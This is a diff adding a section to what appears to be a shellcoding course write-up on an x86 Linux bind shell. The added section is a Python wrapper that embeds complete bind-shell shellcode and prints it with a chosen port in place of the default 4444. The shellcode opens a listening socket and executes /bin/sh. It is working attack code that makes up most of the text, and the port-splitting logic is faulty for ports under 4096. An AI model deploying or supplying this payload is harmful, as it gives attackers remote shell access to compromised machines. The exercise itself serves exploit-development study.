@@ -455,3 +455,31 @@ gcc -fno-stack-protector -z execstack -m32 skeleton.c -o bind_shell
 
 ```
 
+Last task was to make port argument easily configurable. Suggested way is to create wrapper. To create wrapper, we need to find where port number is located. Port number is 4444 which is presented as hex (little endian format): \x11\x5c. When we know the location of port, we can split shell code in pre-port part and post-port part. Python script generates hex representation of given port number and combines all three parts (pre-port, port and post-port part of shell code) in new shell code.  
+
+```
+import sys
+
+shell1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xb2\\x06\\xcd\\x80\\x89\\xc7\\x31\\xc9\\x51\\x51\\x66\\x68"
+port =   "\\x11\\x5c"   # port is by default 4444
+shell2 = "\\x66\\x6a\\x02\\x89\\xe1\\x89\\xc3\\x66\\xb8\\x69\\x01\\xb2\\x16\\xcd\\x80\\x31\\xc0\\xb8\\x6b\\x01\\x00\\x00\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x31\\xc0\\xb8\\x6c\\x01\\x00\\x00\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+
+if len(sys.argv) != 2:
+   print 'Usage: wrapper.py <port>'
+   sys.exit(-1)
+
+else:
+   port_number = sys.argv[1]             # read port number sent as argument
+
+   try:
+      port_number = int(port_number)
+      port_number = hex(port_number)
+      port_num = port_number.replace("0x","")
+      port_num1 = port_num[:2]
+      port_num2 = port_num[2:]
+      print (shell1 + "\\x" + port_num1 + "\\x" + port_num2 + shell2)
+
+   except:
+      print ("Port must be number")
+
+```
